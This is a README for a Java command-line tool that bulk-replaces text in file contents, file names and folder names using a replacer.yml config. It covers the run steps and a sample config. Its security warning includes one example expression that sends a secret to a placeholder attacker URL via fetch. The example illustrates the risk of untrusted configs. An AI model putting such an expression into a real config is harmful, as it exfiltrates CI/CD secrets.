# plusminus-replacer
Search and replace filenames, folder names and text file's content at once

## ⚠️ Security warning: replacer configs are trusted code
`replacer.yml` is **not** plain data — its `from`/`to`/`if` expressions are executed as JavaScript.
Every process environment variable (including any CI/CD **secrets**) is injected into the engine and
is readable by those expressions, which run with **no sandbox**. A malicious or careless config can
therefore read and exfiltrate secrets (for example `js:fetch(evilUrl + '?t=' + SOME_SECRET)`).
**Only run plusminus-replacer with `replacer.yml` files from trusted sources**, and treat authoring
a replacer config as equivalent to granting full access to the environment it runs in.

## How to run
1. Download jar from [Releases](https://github.com/plusminus-software/plusminus-replacer/releases)
and put in the working folder
2. Add replacer.yml file among plusminus-replacer.jar
3. Run ```java -jar plusminus-replacer.jar```

## Example of replacer.yml file
```
- from: foo
  to: bar
  if: "${USER} == 'Taras'" #optional
  scopes: [CONTENT, FILE_NAME, FOLDER_NAME] #optional, [CONTENT] is default
- from: foo2
  to: |-
    multi
    line
    string
...
```